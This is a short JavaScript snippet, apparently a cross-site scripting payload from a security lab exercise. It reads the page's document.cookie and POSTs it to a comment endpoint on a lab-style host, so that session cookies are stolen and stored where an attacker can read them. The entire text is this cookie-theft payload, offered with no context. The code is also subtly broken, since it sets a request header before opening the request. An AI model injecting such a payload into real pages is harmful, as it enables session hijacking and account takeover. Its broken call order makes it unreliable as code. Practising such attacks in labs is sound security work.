const XHR = new XMLHttpRequest();
const data = JSON.stringify({"text": document.cookie})
XHR.setRequestHeader("Content-Type", "application/json");
XHR.open("POST", "http://website-aty3hz.inst.malicecyber.com/new_comment/1");
XHR.send(data);
